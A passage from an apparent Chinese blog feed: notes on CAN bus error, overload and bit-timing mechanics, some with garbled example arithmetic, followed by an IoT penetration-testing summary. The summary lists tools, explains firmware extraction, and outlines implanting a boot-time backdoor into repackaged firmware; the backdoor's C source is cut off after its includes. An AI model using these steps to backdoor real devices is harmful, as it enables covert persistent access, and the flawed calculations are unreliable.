处于被动错误状态，说明这个节点目前是不太可靠的，出现错误的原因可能是它本身的问题，<br>即刚刚检测到的错误可能仅仅只有它自己遇到，正是因为这一点，整个总线才不信任它报告的错误，<br>从而只允许它发送六个连续的隐性位，这样它才不会拖累别人。<br></code></pre></td></tr></table></figure><p><strong>3）总线关闭状态</strong><br>如果一个处于被动错误状态的节点，仍然多次发送被动错误帧，那么势必导致TEC ＞ 255，这样就处于总线关闭状态。</p><p>在总线关闭状态下的节点Node_A不能向总线上发送报文，也不能从总线上接收报文，整个节点脱离总线。等到检测到128次11个连续的隐性位时，TEC和REC置0，重新回到主动错误状态。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c">按照我的理解 <br>这个所谓“检测到<span class="hljs-number">128</span>次<span class="hljs-number">11</span>个连续隐性位”其实就是让这个节点隔离一段时间冷静下，<br>因为它一旦处于总线关闭状态，就不会和总线有任何的联系，<br>这个时候只要它计算时间等于达到传送<span class="hljs-number">128</span>次<span class="hljs-number">11</span>个连续隐性位所用的时间，就可以重新连到总线上。<br><br><br>Tips: <br>处于总线关闭状态说明，这个节点目前挂掉了，<br>总线先把它踢开，这样它才不会拖累别人，等到它冷静一段时间之后再回到总线上。<br></code></pre></td></tr></table></figure><h6 id="4-4-8-3-9-错误帧的发送"><a href="#4-4-8-3-9-错误帧的发送" class="headerlink" title="4.4.8.3.9 错误帧的发送"></a>4.4.8.3.9 错误帧的发送</h6><p>在检测到错误之后，什么时候发送错误帧呢？<br>按照CAN协议的规定：<br><strong>位错误、填充错误、格式错误、ACK错误</strong>： 在错误产生的那一位的下一位开始发送错误帧。<br><strong>CRC错误</strong>：紧随ACK界定符后的位发送错误帧。</p><p>例子1：</p> <img src="/2021/08/22/%E8%BD%A6%E8%81%94%E7%BD%91%E6%95%B4%E8%BD%A6%E6%9E%B6%E6%9E%84/images/%E4%BE%8B%E5%AD%901.png" class=""><p>（1）发送节点Node_A发送一个显性位，但是却从总线上听到一个隐形位，于是Node_A节点就会检测到一个位错误； （2）Node_A检测到位错误之后，立即在下一位开始发送主动错误帧：6个连续显性位的主动错误标志+8个连续隐性位的错误界定符； （3)对应Node_A发出的主动错误标志，总线上电平为6个连续显性位；</p><p>（4）接收节点Node_B和Node_C从总线上听到连续6个显性位，那么就会检测到一个填充错误，于是这两个节点都会发送主动错误帧；<br>（5）对应Node_B和Node_C发出的主动错误标志，总线电平又有6个连续显性电平，对应Node_B和Node_C发出的错误界定符，总线电平有8个连续的隐性电平。<br>（6）在间歇场之后，Node_A节点重新发送刚刚出错的报文。</p> <img src="/2021/08/22/%E8%BD%A6%E8%81%94%E7%BD%91%E6%95%B4%E8%BD%A6%E6%9E%B6%E6%9E%84/images/%E9%94%99%E8%AF%AF%E5%B8%A7.png" class=""><p>从上图中可以看出错误帧之中，错误标志重叠部分是怎样形成的，<br>这个例子中，位错误的错误标志与填充错误的错误标志重叠两位，剩下的部分还有四位：</p> <img src="/2021/08/22/%E8%BD%A6%E8%81%94%E7%BD%91%E6%95%B4%E8%BD%A6%E6%9E%B6%E6%9E%84/images/%E4%BD%8D%E9%94%99%E8%AF%AF%E7%9A%84%E9%94%99%E8%AF%AF%E6%A0%87%E5%BF%97.png" class=""><h4 id="4-4-9-过载帧"><a href="#4-4-9-过载帧" class="headerlink" title="4.4.9 过载帧"></a>4.4.9 过载帧</h4><p>过载帧是接收节点向总线上其它节点报告自身接收能力达到极限的帧。</p><p>上面这句话可以这样理解：接收节点Node_A接收报文的能力达到极限了，于是Node_A就会发出过载帧来告诉总线上的其它节点（包括发送节点），我接收节点Node_A已经没有能力处理你们发来的报文了。</p><p>过载帧包括：过载标志和过载界定符两个部分<br>过载标志：连续6个显性位；<br>过载界定符：连续8个隐性位。</p><p>与错误帧类似，过载帧中有过载帧重叠部分，且形成过载重叠标志的原因与形成错误帧中的错误重叠标志的原因是相同的</p> <img src="/2021/08/22/%E8%BD%A6%E8%81%94%E7%BD%91%E6%95%B4%E8%BD%A6%E6%9E%B6%E6%9E%84/images/%E9%94%99%E8%AF%AF%E9%87%8D%E5%8F%A0%E6%A0%87%E5%BF%97.png" class=""><p>对于过载帧的帧结构我们可以这样理解：<br>接收节点Node_A达到接收极限时，就会发出过载帧到总线上，<br>显然，过载标志的6个连续显性位会屏蔽掉总线上其它节点的发送，<br>也就是说这个时候Node_A通过发送过载帧的方式来破坏其它节点的发送，<br>这样在Node_A发送过载帧期间，其它节点就不能成功发送报文，<br>于是就相当于把其它节点的发送推迟了，也就是说Node_A在其发送过载帧的这段时间得以“休息”。</p><p>有三种情况会引起过载帧：</p><ol><li>接收节点自身原因。<br>接收节点由于某种原因需要延迟接收下一个数据帧或者遥控帧。</li><li>在帧间隔的间歇段的第一位和第二位检测到一个显性位（正常的间歇段都是隐性位）<br>帧间隔的间隔段本应是三个连续的隐性位，<br>如果接收节点Node_A在间隔段检测到显性位，<br>那么就意味着此时有报文发向接收节点Node_A，<br>但这个时候是不应该有报文发来的，于是Node_A发送过载帧。</li><li>CAN节点在错误界定符或过载界定符的第八位(最后一位)听到一个显性位0，节点会发送一个过载帧，且错误计数器不会增加。<br>接收节点Node_A在错误界定符和过载界定符的最后一位听到显性位，<br>也意味着有报文发向Node_A，但这个时候是不应该有报文发来的，<br>于是Node_A发送过载帧。</li></ol><h4 id="4-4-10-帧间隔"><a href="#4-4-10-帧间隔" class="headerlink" title="4.4.10 帧间隔"></a>4.4.10 帧间隔</h4><p>帧间隔是用来隔离数据帧（或者遥控帧）的，也就是说，<br>数据帧（或者遥控帧）通过插入帧间隔可以将本帧与先行帧（数据帧、遥控帧、错误帧、过载帧）分隔开来。</p><p>Tips: 过载帧和错误帧的前面不能插入帧间隔。</p><p>帧间隔有两种不同的形式：<br>主动错误状态的帧间隔：</p> <img src="/2021/08/22/%E8%BD%A6%E8%81%94%E7%BD%91%E6%95%B4%E8%BD%A6%E6%9E%B6%E6%9E%84/images/%E4%B8%BB%E5%8A%A8%E9%94%99%E8%AF%AF%E7%8A%B6%E6%80%81%E7%9A%84%E5%B8%A7%E9%97%B4%E9%9A%94.png" class=""><p>被动错误状态的帧间隔：</p> <img src="/2021/08/22/%E8%BD%A6%E8%81%94%E7%BD%91%E6%95%B4%E8%BD%A6%E6%9E%B6%E6%9E%84/images/%E8%A2%AB%E5%8A%A8%E9%94%99%E8%AF%AF%E7%8A%B6%E6%80%81%E7%9A%84%E5%B8%A7%E9%97%B4%E9%9A%94.png" class=""><p><strong>间隔段</strong>：<br>连续三个隐性位；间隔段期间，所有节点不允许发送数据这或遥控帧，只要在这期间监听到显性位，接收节点就会发送过载帧。</p><p><strong>空闲段</strong>：<br>连续隐性位，个数不一定，0个或者多个都可以。总线空闲的时间是任意长的，只要总线空闲，节点就可以竞争总线。</p><p><strong>暂停段</strong>:<br>只有处于被动错误状态的节点在发送帧间隔的时候，才会在帧间隔中插入8个连续隐性位的暂停段。</p><p><strong>暂停段，又叫做延迟传送段，为什么节点处于被动状态时会有这样一段呢。</strong><br>=====&gt;<br>原因如下:<br>首先，考虑主动错误状态的节点Node_A，发送主动错误标志之后，随之就要重新发送刚刚发送失败的报文，<br>但是为了间隔开与前面刚刚发送的错误帧，总线在错误帧之后就会插入３个隐形位的帧间隔，<br>在这３个隐形位期间，其它的节点不足以判定总线空闲（需要连续11个隐性位才能判定），<br>所以Node_A仍然占据着总线的控制权，<br>于是在帧间隔之后，Node_A能够接着发送报文。</p><p>现在Node_A转入到被动错误状态了，说明它已经不是很可靠了，<br>这个时候如果没有延迟传送段，在Node_A发出被动错误标志之后，它仍然能够在3位的帧间隔之后立即重新发送报文，<br>这是不符合我们对被动错误状态的处理要求的当然也是不符合CAN协议的，<br>于是乎对于发送出被动错误标志的节点，总线在帧间隔中加入了８个连续隐性位的延迟传送段，这样的3+8=11个连续隐性位。<br>就能让Node_A在这个帧间隔期间失去对总线的控制权，从而优先保证其它正常(处于主动错误状态)节点能够使用总线，<br>而不必等着一个已经不可靠的Node_A占据总线。</p><h3 id="4-5-CAN通信的位定时与同步"><a href="#4-5-CAN通信的位定时与同步" class="headerlink" title="4.5 CAN通信的位定时与同步"></a>4.5 CAN通信的位定时与同步</h3><h4 id="4-5-1-位定时"><a href="#4-5-1-位定时" class="headerlink" title="4.5.1 位定时"></a>4.5.1 位定时</h4><h5 id="4-5-1-1-比特率和波特率"><a href="#4-5-1-1-比特率和波特率" class="headerlink" title="4.5.1.1 比特率和波特率"></a>4.5.1.1 比特率和波特率</h5><ol><li><strong>位速率</strong><br>又叫做比特率（bit rata）、信息传输率，<br>表示的是单位时间内，总线上传输的信息量，即每秒能够传输的二进制位的数量，<br>单位是bit per second。</li><li><strong>波特率</strong><br>又叫做传码率、信号传输率，表示的是单位时间内传输的码元的数量，<br>当两相调制时，一个码元用一个二进制位表示，此时波特率在数值上和比特率是一样的，CAN总线正是两项调制这种情况。</li></ol><p>Tips: 比特率和波特率并不是一回事儿，这一定一定要牢记</p><h5 id="4-5-1-2-位时间"><a href="#4-5-1-2-位时间" class="headerlink" title="4.5.1.2 位时间"></a>4.5.1.2 位时间</h5><h6 id="4-5-1-2-1-位时间的概念"><a href="#4-5-1-2-1-位时间的概念" class="headerlink" title="4.5.1.2.1 位时间的概念"></a>4.5.1.2.1 位时间的概念</h6><p>位时间：表示的是一个二进制位在总线上传输时所需要的时间。<br>所以：<br>位速率 = 1 / 位时间</p><p>首先了解以下CAN总线系统中的两个时钟：晶振时钟周期 和 CAN时钟周期</p><ol><li><strong>晶振时钟周期</strong><br>是由单片机振荡器的晶振频率决定的，指的是振荡器每震荡一次所消耗的时间长度，也是整个系统中最小的时间单位。</li><li><strong>CAN时钟周期</strong><br>CAN时钟是由系统时钟分频而来的一个时间长度值，实际上就是一个时间份额Tq。</li></ol><p>可以按照下面的公式计算： CAN时钟周期 = 2 × 晶振时钟周期 × BRP<br>其中BRP叫做波特率预分频值（baudrate prescaler）。</p> <img src="/2021/08/22/%E8%BD%A6%E8%81%94%E7%BD%91%E6%95%B4%E8%BD%A6%E6%9E%B6%E6%9E%84/images/%E4%BD%8D%E6%97%B6%E9%97%B4%E7%9A%84%E6%A6%82%E5%BF%B5.png" class=""><h6 id="4-5-1-2-2-位时间的分段"><a href="#4-5-1-2-2-位时间的分段" class="headerlink" title="4.5.1.2.2 位时间的分段"></a>4.5.1.2.2 位时间的分段</h6><p>如上文所述，在CAN的位定时中，一个CAN时钟周期称为一个时间量子 — Tq。<br>如下图所示：<br>位时间分为四个段：同步段、传播段、相位缓冲段1、相位缓冲段2，总共8~25个时间量子（Tq）</p> <img src="/2021/08/22/%E8%BD%A6%E8%81%94%E7%BD%91%E6%95%B4%E8%BD%A6%E6%9E%B6%E6%9E%84/images/%E4%BD%8D%E6%97%B6%E9%97%B4%E7%9A%84%E5%88%86%E6%AE%B5.png" class=""><p><strong>1）同步段（Synchronization Segment）</strong><br>长度固定，1个时间量子Tq；<br>一个位的传输从同步段开始；<br>同步段用于同步总线上的各个节点，一个位的跳边沿在此时间段内。</p><p><strong>2）传播段（Propagation Segment）</strong><br>传播段用于补偿报文在总线和节点上传输时所产生的时间延迟；<br>传播段时长 ≥ 2 × 报文在总线和节点上传输时产生的时间延迟 ；<br>传播段时长可编程（1~8个时间量子Tq）。</p><p><strong>3）相位缓冲段1（Phase Buffer Segment1）</strong><br>用于补偿节点间的晶振误差；<br>允许通过重同步对该段加长；<br>在这个时间段的末端进行总线状态的采样；<br>长度可编程（1~8个时间量子Tq）</p><p><strong>4）相位缓冲段2（Phase Buffer Segment2）</strong><br>用于补偿节点间的晶振误差；<br>允许通过重同步对该段缩短；<br>长度可编程（1~8个时间量子Tq）</p><p>于是 tBit = tSS + tPS +tPBS1 + tPBS2<br>tBit:位时间<br>tSS:同步段时间<br>tPS:传播段时间<br>tPBS1:时间段1<br>tPBS2:时间段2</p><h4 id="4-5-2-CAN的同步机制"><a href="#4-5-2-CAN的同步机制" class="headerlink" title="4.5.2 CAN的同步机制"></a>4.5.2 CAN的同步机制</h4><p>在CAN通信中，有两种同步机制：硬同步 与 重同步。</p><h5 id="4-5-2-1-同步的规则"><a href="#4-5-2-1-同步的规则" class="headerlink" title="4.5.2.1  同步的规则"></a>4.5.2.1  同步的规则</h5><p>☆ 一个位时间内只允许一种同步方式，要么硬同步要么重同步；<br>☆ 任何一个从“隐性”到“显性”的下降沿 都可以用于同步；<br>☆ 硬同步发生在报文的SOF位，所有接收节点调整各自当前位的同步段，使其位于发送的SOF位内；<br>☆ 重同步发生在一个报文SOF位之外的其它段，当下降沿落在了同步段之外时发生重同步；<br>☆ 在SOF到仲裁场发送的时间段内，如果有多个节点同时发送报文，那么这些发送节点对跳变沿不进行重同步</p><h5 id="4-5-2-2-硬同步"><a href="#4-5-2-2-硬同步" class="headerlink" title="4.5.2.2 硬同步"></a>4.5.2.2 硬同步</h5><p>硬同步发生在SOF位，所有接收节点调整各自当前位的同步段，调整宽度不限</p> <img src="/2021/08/22/%E8%BD%A6%E8%81%94%E7%BD%91%E6%95%B4%E8%BD%A6%E6%9E%B6%E6%9E%84/images/%E7%A1%AC%E5%90%8C%E6%AD%A5.png" class=""><p>（1）发送节点Node_A在发送SOF位时，SOF位的下降沿在SS段；<br>（2）这个时候接收节点Node_B发现自己当前位的SS段和发送节点SOF位的SS段不同步。也就是说当Node_A产生SOF位SS段时，Node_B的当前位的SS段已经在5个Tq之前产生了；<br>（3）于是接收节点Node_B强行将自己当前位的SS段拉到与SOF位的SS段同步。</p><h5 id="4-5-2-3-重同步"><a href="#4-5-2-3-重同步" class="headerlink" title="4.5.2.3 重同步"></a>4.5.2.3 重同步</h5><p>重同步发生在一个报文SOF位之外的其它位场内，<br>当接收节点Node_B当前位的下降沿落在了发送节点Node_A当前位的同步段之外时发生重同步。<br>重同步会导致相位缓冲段1的延长或者相位缓冲段2的缩短，从而保证采样点的准确。</p><h6 id="4-5-2-3-1-PBS1延长"><a href="#4-5-2-3-1-PBS1延长" class="headerlink" title="4.5.2.3.1 PBS1延长"></a>4.5.2.3.1 PBS1延长</h6><p>发的晚（慢），收的早（块），导致PBS1延长。</p> <p>如上图所示：<br>（1）发送节点Node_A比接收节点Node_B的时间慢了，也就是说Node_A当前位的ss段产生的时候，Node_B 当前位的ss段已经在2个Tq之前产生了；<br>（2）所以这个时候接收节点Node_B就将PBS1延长2个Tq的时间；<br>（3）于是这个时候Node_A当前位的采样点就和Node_B的采样点同步了。</p><h6 id="4-5-2-3-2-PBS2缩短"><a href="#4-5-2-3-2-PBS2缩短" class="headerlink" title="4.5.2.3.2 PBS2缩短"></a>4.5.2.3.2 PBS2缩短</h6><p>发的早（快），收的晚（慢），导致PBS2缩短。</p> <img src="/2021/08/22/%E8%BD%A6%E8%81%94%E7%BD%91%E6%95%B4%E8%BD%A6%E6%9E%B6%E6%9E%84/images/PBS2%E7%BC%A9%E7%9F%AD.png" class=""><p>如上图所示：<br>（1）发送节点Node_A当前位的SS段诞生2Tq时长之后，接收节点Node_B的当前位才产生SS段；<br>（2）于是，接收节点Node_B当前位的PBS2段缩短，<br>（3）这样就会导致接收节点Node_B的下一位能够提前2个Tq，从而Node_B的下一位采样点和Node_A下一位的采样点能够同步。</p><h6 id="4-5-2-3-3-同步跳转宽度"><a href="#4-5-2-3-3-同步跳转宽度" class="headerlink" title="4.5.2.3.3 同步跳转宽度"></a>4.5.2.3.3 同步跳转宽度</h6><p>在重同步时，有个同步跳转宽度（SJW，Synchro Jump Width）的概念，表示的是PBS1和PBS2重同步时允许跳转的最大宽度。<br>同步跳转宽度必须满足以下几个条件：</p><p>SJW必须小于PBS1和PBS2的最小值<br>SJW最大值不能超过4</p><h4 id="4-5-3-位定时参数的确定"><a href="#4-5-3-位定时参数的确定" class="headerlink" title="4.5.3 位定时参数的确定"></a>4.5.3 位定时参数的确定</h4><p>位定时的参数主要涉及以下几个：<br>（1）位速率：单位为bps、Kbps、Mbps<br>1Mbps = 1000Kbps = 1000000bps</p><p>（2）位时间：tBit，单位一般为纳秒(ns)<br>tBit =1 / 位速率</p><p>（3）时间量子Tq：<br>Tq =1 / NBT<br>NBT 表示的是一个位时间tBit内包含Tq的个数。</p><p>（4）传输延迟时间tPTS<br>CAN报文在CAN总线上的传输时，物理延迟包含两个部分：<br>在CAN-BUS上传输造成的延迟<br>在节点上传输造成延迟</p> <img src="/2021/08/22/%E8%BD%A6%E8%81%94%E7%BD%91%E6%95%B4%E8%BD%A6%E6%9E%B6%E6%9E%84/images/%E4%BD%8D%E5%AE%9A%E6%97%B6%E5%8F%82%E6%95%B0%E7%9A%84%E7%A1%AE%E5%AE%9A.png" class=""><p>按照CAN通信协议的规定，补偿给传播延迟的时间长度要至少等于实际实际传播延迟时长的2倍，即：<br>tPTS ≥ 2 × tdel = 2 × ( tdel + tBus )</p><p>需要注意的是：<br>Tips: 在CAN总线通信系统中是以时间量子Tq来度量时间的，所以如果延迟补偿时间 tPTS = 3.1Tq，那么这个时候要取：tPTS = 4Tq。</p><p>（5）相位缓冲段<br>相位缓冲段的时间长度分为两种情况：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (NBT<span class="hljs-number">-1</span>-tPTS_Tq)/<span class="hljs-number">2</span>==偶数<br>    PBS1_Tq = PBS2_Tq = (NBT<span class="hljs-number">-1</span>-tPTS_Tq)/<span class="hljs-number">2</span><br><span class="hljs-keyword">else</span><br>    PBS1_Tq = (NBT<span class="hljs-number">-1</span>-tPTS_Tq)/<span class="hljs-number">2</span><br>    PBS2_Tq = PBS1_Tq + <span class="hljs-number">1</span><br><span class="hljs-number">12345</span><br></code></pre></td></tr></table></figure><p>(6) 同步跳转宽度<br>SJW = min ( PBS1_Tq , 4 )</p><p>(7) 验证晶振误差Df<br>CAN总线的晶振误差必须同时满足下面三个条件：</p><p>Df &lt;= SJW / (2×10×NBT)<br>Df &lt;= min(PBS1_Tq,PBS2_Tq) / ( 2×(13×NBT−PBS2_Tq) )<br>Df ≤ 1.58%</p><h4 id="4-5-4-例子"><a href="#4-5-4-例子" class="headerlink" title="4.5.4 例子"></a>4.5.4 例子</h4><p>以下面的例子来讲述位定时参数的确定方法：<br>MCU晶振16MHz，位速率1Mbps，总线长度20m，单位总线延迟5ns/m，物理接口的发送接收延迟150ns</p><p>（1）晶振时钟周期：T=1s/16MHz = 62.5ns</p><p>（2）位时间 ：tBit = 1/1Mbps = 1000ns</p><p>（3）BPR和NBT：考虑到 T = 125ns，tBit = 1000ns，所以BPR只能取值为1，才能满足NBT∈[8,25],于是预分频数BPR=1；</p><p>（4）CAN时钟周期Tq = 2 × 62.5 × 1 = 125ns</p><p>（5）NBT = 8</p><p>（6）传输延迟时间tPTS ———— tPTS = 2 ×（ 20 × 5 + 150 ）= 500ns<br>所以<br>tPTS_Tq = tPTS / Tq = 500 / 125=4</p><p>于是NBT=8个Tq的长度中需要有4个Tq用于补偿传播延迟，于是还剩下4个Tq，<br>SS同步段长度固定占据1个Tq，还剩3个Tq，于是PBS1分配一个Tq，PBS2分配2个Tq。</p><p>（7）同步跳转宽度 SJW=min{PBS1,4}=1</p><p>（8）晶振误差<br>Df &lt;= SJW / (2×10×NBT) = 1 / (2×10×8)=0.00625</p><p>Df &lt;= min(PBS1_Tq,PBS2_Tq) / ( 2×(13×NBT−PBS2_Tq) ) = 12 × ( 13×8 − 2) = 0.00490</p><h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>blog.csdn.net<span class="hljs-regexp">/weixin_40528417/</span>article<span class="hljs-regexp">/details/</span><span class="hljs-number">79534483</span><br>公众号-嘴哥有料<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>IOT</category>
      
    </categories>
    
    
    <tags>
      
      <tag>IOT</tag>
      
      <tag>车联网</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>IOT渗透测试总结</title>
    <link href="/2021/08/22/IOT%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%80%BB%E7%BB%93/"/>
    <url>/2021/08/22/IOT%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<h1 id="1-工具"><a href="#1-工具" class="headerlink" title="1. 工具"></a>1. 工具</h1><h2 id="1-1-固件分析"><a href="#1-1-固件分析" class="headerlink" title="1.1 固件分析"></a>1.1 固件分析</h2><ol><li>Binwalk</li><li>Firmadyne</li><li>Angr</li><li>Firmware-mod-tookit</li><li>Firmware Analysis Toolkit</li><li>GDB</li><li>Radare2</li><li>Binary Analysus Tool（BAT）</li><li>Qemu</li><li>IDA Pro</li></ol><h2 id="1-2-Web渗透测试工具"><a href="#1-2-Web渗透测试工具" class="headerlink" title="1.2 Web渗透测试工具"></a>1.2 Web渗透测试工具</h2><ol><li>Burp Suite</li><li>OWASP Zed Attsvk Proxy（ZAP）</li><li>PEST Easy Firefox Plugin</li><li>Postman Chrome Extension</li></ol><h2 id="1-3-移动应用渗透测试工具"><a href="#1-3-移动应用渗透测试工具" class="headerlink" title="1.3 移动应用渗透测试工具"></a>1.3 移动应用渗透测试工具</h2><ul><li>Android<ol><li>Android SDK</li><li>JD-GUI</li><li>JEB</li><li>SQLite Browser</li><li>Burp Suite</li><li>OWASP ZAP</li></ol></li><li>IOS<ol><li>IDB</li><li>Xcode Tools</li><li>CLass-Dump</li><li>Hopper</li><li>Mob-SF</li><li>SQLite Browser</li><li>Burp Suite</li><li>OWASP ZAP</li><li>Cydia (以下应用需要越狱环境)</li><li>OpenURL</li><li>DumpDecrypted</li><li>Ipainstaller</li><li>SSL KILL Switch 2</li><li>Clutch 2</li><li>Cycript</li></ol></li></ul><h2 id="1-4-硬件工具"><a href="#1-4-硬件工具" class="headerlink" title="1.4 硬件工具"></a>1.4 硬件工具</h2><ol><li>万用表</li><li>用于硬件拆解的IFixit clasic pro tech toolkit工具套装</li><li>Bus Pirate</li><li>USB转串口转接器：Shikra、FTDIDT232、CP2012、PL2303、Adafruit FTDI Friend</li><li>JTAG接口转接器：Shikra、JTAGulator、Arduino with JTAGenum、JLINK、Bus Blaster</li><li>逻辑分析仪</li></ol><h2 id="1-5-硬件分析工具"><a href="#1-5-硬件分析工具" class="headerlink" title="1.5 硬件分析工具"></a>1.5 硬件分析工具</h2><ol><li>OpenOCD</li><li>Spiflash</li><li>Minicom</li><li>Baudrate</li></ol><h2 id="1-6-无线电分析硬件工具"><a href="#1-6-无线电分析硬件工具" class="headerlink" title="1.6 无线电分析硬件工具"></a>1.6 无线电分析硬件工具</h2><ol><li>Atmel RZ Raven</li><li>Attify Badge</li><li>HackRF One</li><li>Yardstick One</li><li>带有Xbee Shield模块的XBee扩展版</li><li>Ubertooth</li><li>BLE适配器</li></ol><h2 id="1-7-无线电分析软件"><a href="#1-7-无线电分析软件" class="headerlink" title="1.7 无线电分析软件"></a>1.7 无线电分析软件</h2><ol><li>KillerBee框架</li><li>Attify ZigBee框架</li><li>GUN Radio</li><li>GQRX</li><li>Ubertooth tools</li><li>Blue Hydra</li><li>RTL-sdr</li><li>Hackrf packages</li><li>EZ-ware</li></ol><h1 id="2-固件分析"><a href="#2-固件分析" class="headerlink" title="2. 固件分析"></a>2. 固件分析</h1><p>固件中的内部组织包括boot-loader、内核、文件系统以及其他内容。</p><p>文件系统主要关注内容：</p><ul><li>口令</li><li>API Token</li><li>URL</li><li>存在漏洞的服务</li><li>后门账户</li><li>配置文件</li><li>源代码</li><li>私钥</li><li>数据存储方式</li></ul><h2 id="2-1-固件提取"><a href="#2-1-固件提取" class="headerlink" title="2.1 固件提取"></a>2.1 固件提取</h2><ol><li><p>从厂商网站下载</p></li><li><p>代理或设备更新时的流量</p><p>ettercap+wireshark</p></li><li><p>直接从设备转储固件</p><p>通过UART、SPI、JTAG接口直接转储或闪存芯片读取</p></li><li><p>Google搜索</p></li></ol><h2 id="2-2-文件系统读取"><a href="#2-2-文件系统读取" class="headerlink" title="2.2 文件系统读取"></a>2.2 文件系统读取</h2><p>以Squashfs系统为例，头部特征字符串较多，目前已知7种：</p><ol><li>标准固件大端序模式位-sqsh</li><li>标准固件小端序模式-hsqs</li><li>LZMA压缩下的大端模式-sqlz</li><li>3.3版本的Squashfs文件系统在LZMA压缩下的大端序模式-qshs</li><li>部门非标准固件小端序模式-shsq（多为D-Link固件）</li><li>DD-WRT固件小端序模式-hsqt</li><li>DD-WRT固件大端序模式-tqsh</li></ol><h3 id="2-2-1-Squashfs文件系统提取"><a href="#2-2-1-Squashfs文件系统提取" class="headerlink" title="2.2.1 Squashfs文件系统提取"></a>2.2.1 Squashfs文件系统提取</h3><h4 id="2-2-1-1-unSquashfs提取"><a href="#2-2-1-1-unSquashfs提取" class="headerlink" title="2.2.1.1 unSquashfs提取"></a>2.2.1.1 unSquashfs提取</h4><ol><li><p>根据特征值使用hexdump获取Squashfs文件系统起始地址。</p><p>hexdump -c xxxx.trx |grep -i ‘hsqs’</p></li><li><p>dd转存文件系统</p><p>dd if=xxx bs=1 skip=xxx of=xx</p></li><li><p>二进制文件提取文件系统</p><p>Unsquashfs  xxxx</p></li></ol><h4 id="2-2-1-2-binwalk提取"><a href="#2-2-1-2-binwalk提取" class="headerlink" title="2.2.1.2 binwalk提取"></a>2.2.1.2 binwalk提取</h4><p>binwalk提取与第一种提取思路一样，binwalk会判断目标文件系统，根据特征值进行转存，然后从二进制种提取文件系统</p><p>binwalk -Me xxx</p><h2 id="2-3-文件系统分析"><a href="#2-3-文件系统分析" class="headerlink" title="2.3 文件系统分析"></a>2.3 文件系统分析</h2><h4 id="2-3-1-手工分析"><a href="#2-3-1-手工分析" class="headerlink" title="2.3.1 手工分析"></a>2.3.1 手工分析</h4><ol><li><p>find *.conf查找配置文件。</p></li><li><p>查找key、ras、des、cer等关键字。</p></li></ol><h4 id="2-3-2-自动化"><a href="#2-3-2-自动化" class="headerlink" title="2.3.2 自动化"></a>2.3.2 自动化</h4><p>自动搜索敏感信息</p><p><a href="https://github.com/craigz28/firmwalker">firmwalker</a></p><h4 id="2-3-3-固件仿真动态分析"><a href="#2-3-3-固件仿真动态分析" class="headerlink" title="2.3.3 固件仿真动态分析"></a>2.3.3 固件仿真动态分析</h4><p><a href="https://github.com/attify/firmware-analysis-toolkit">Firmware Analysis Toolkit</a>（FAT）采用Firmadyne工具实现镜像仿真。</p><p>Firmadyne底层基于QEMU虚拟机，用户能够对整个系统架构进行仿真并在该架构之上运行固件。</p><p>FAT脚本能够执行的操作:</p><ul><li>从固件系统提取文件系统</li><li>获取固件架构</li><li>制作所需镜像</li><li>网络设置</li><li>镜像仿真</li></ul><h4 id="2-3-4-二进制逆向分析"><a href="#2-3-4-二进制逆向分析" class="headerlink" title="2.3.4 二进制逆向分析"></a>2.3.4 二进制逆向分析</h4><p>Radar2、IDA、Hopper</p><h4 id="2-3-5-后门植入"><a href="#2-3-5-后门植入" class="headerlink" title="2.3.5 后门植入"></a>2.3.5 后门植入</h4><p><a href="https://github.com/rampageX/firmware-mod-kit">firmware-mod-kit</a>（FMK）,支持从固件提取文件系统，对其修改后重新打包。</p><ol><li><p>extract-firmware.sh  -文件系统提取</p><p>提取后包括rootfs、image_part和logs等文件，其中rootfs中包含了固件中的整套文件系统，我们需要做的是在固件中添加后门，然后找到固件启动后自动调用后门的方法。</p></li><li><p>readelf查看文件文件系统内的可执行文件，判断是大端架构还是小端架构</p></li><li><p>使用MIPS交叉编译器编译后门源码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/socket.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span 